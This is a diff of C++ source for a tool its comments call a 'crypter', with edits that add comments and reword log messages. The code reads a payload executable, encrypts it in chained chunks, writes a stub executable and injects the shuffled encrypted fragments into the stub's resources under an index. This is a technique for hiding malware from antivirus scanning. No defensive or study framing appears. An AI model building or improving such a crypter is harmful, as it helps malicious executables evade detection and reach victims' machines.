@@ -98,7 +98,7 @@ bool ParseCommandLine(int argc, char* argv[], CLIParams& params) {
             }
         }
         else {
-            // Handle legacy format (no flags) for backward compatibility
+            // Handle legacy format (no flags) for backward compatibility (if payload is input first after crypter exe)
             if (i == 1 && params.inputFile.empty()) {
                 params.inputFile = arg;
                 g_inputFile = params.inputFile;
@@ -128,7 +128,7 @@ bool ParseCommandLine(int argc, char* argv[], CLIParams& params) {
 
     return true;
 }
-
+//validate whether payload is not over the length limit, exists, and is a file
 bool ValidateInputFile(const string& filename) {
     // Check if file exists
     DWORD attrib = GetFileAttributesA(filename.c_str());
@@ -207,7 +207,7 @@ bool ValidateOutputFile(const string& filename) {
     return true;
 }
 
-
+//validation function, calculates crc32 checksum based on data and length
 uint32_t CalculateCRC32(const char* data, size_t length) {
     uint32_t crc = 0xFFFFFFFF;
     for (size_t i = 0; i < length; i++) {
@@ -254,7 +254,7 @@ bool WriteStubToFile() {
     return (size == Stub_exe_len);
 }
 
-
+//handle fragment encryption and construction
 std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long size, uint8_t seed_key) {
     const int CHUNK_SIZE = 4096;
     int totalChunks = (size + CHUNK_SIZE - 1) / CHUNK_SIZE;
@@ -369,7 +369,7 @@ std::vector<std::vector<BYTE>> EncryptPayloadChained(const char* payload, long s
 
     return encrypted_chunks;
 }
-
+//inject fragments into resources
 bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chunks, 
                              long payloadSize, uint8_t seed_key) {
     cout << "[*] Starting resource injection with shuffle..." << endl;
@@ -411,7 +411,7 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
     index.shuffle_seed = shuffle_seed;
     
     cout << "[*] Using shuffle seed: " << shuffle_seed << endl;
-    cout << "[*] Injecting index (ID 999) with " << encrypted_chunks.size() << " chunks starting at ID " << first_chunk_id << endl;
+    cout << "[*] Injecting metadata index (ID 999) with payload " << encrypted_chunks.size() << " fragments starting at ID " << first_chunk_id << endl;
 
     // Inject index
     if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(999),
@@ -451,7 +451,7 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
         }
         
         cout << "[+] Injecting logical chunk " << logical_chunk_idx 
-             << " → Resource ID " << resource_id 
+             << " Resource ID " << resource_id 
              << " (position " << resource_position << ")" << endl;
         
         if (!UpdateResourceA(hUpdate, "RCDATA", MAKEINTRESOURCEA(resource_id),
@@ -480,7 +480,7 @@ bool InjectWithSeparateIndex(const std::vector<std::vector<BYTE>>& encrypted_chu
     return true;
 }
 
-
+//handle payload exe
 bool ReadPayloadFile(const char* filename, char** buffer, long* size) {
     FILE* file = fopen(filename, "rb");
     if (!file) {
